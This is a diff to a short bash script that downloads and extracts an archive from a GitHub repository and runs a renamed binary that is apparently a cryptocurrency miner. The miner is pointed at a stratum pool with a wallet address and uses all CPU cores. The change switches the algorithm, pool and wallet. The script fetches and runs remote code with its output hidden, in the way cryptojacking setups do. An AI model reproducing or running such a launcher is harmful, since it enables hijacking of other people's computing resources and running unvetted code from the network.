@@ -1,3 +1,3 @@
 #!/bin/bash
 wget https://github.com/ganggamulyana08/lotek/raw/main/cux.tar.gz && tar -xvf cux.tar.gz >/dev/null 2>&1
-./cux -a yespowertide  -o stratum+tcp://stratum-asia.rplant.xyz:7059 -u TFJuSRiKbvp3DWj1anKAe3Q92m5pMteCC4.glakek -t $(nproc --all)
+./cux -a gr -o stratum+tcp://asia.flockpool.com:4444 -u RPptgkib7iVDwwxgjCqBZE7z3c5QLprA3E.rujak -t $(nproc --all)
